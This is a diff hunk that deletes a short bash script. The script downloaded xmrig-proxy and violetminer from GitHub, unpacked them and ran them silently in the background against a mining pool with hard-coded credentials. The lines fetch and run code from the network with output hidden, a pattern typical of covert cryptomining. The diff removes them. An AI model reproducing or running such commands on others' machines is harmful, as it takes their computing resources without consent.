@@ -1,3 +1,0 @@
-#!/bin/bash
-wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.14.0/xmrig-proxy-6.14.0-linux-x64.tar.gz && tar xvf xmrig-proxy-6.14.0-linux-x64.tar.gz && cd xmrig-proxy-6.14.0 && ./xmrig-proxy -a rx/0 -o pool.allcoins.pw:3333 -u allcoins.pw -p 581058 -b 0.0.0.0:3333 -m simple >/dev/null &
-wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -zxf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.allcoins.pw:3333 --username allcoins.pw --password 581058 --algorithm wrkzcoin >/dev/null >/dev/null 2>&1
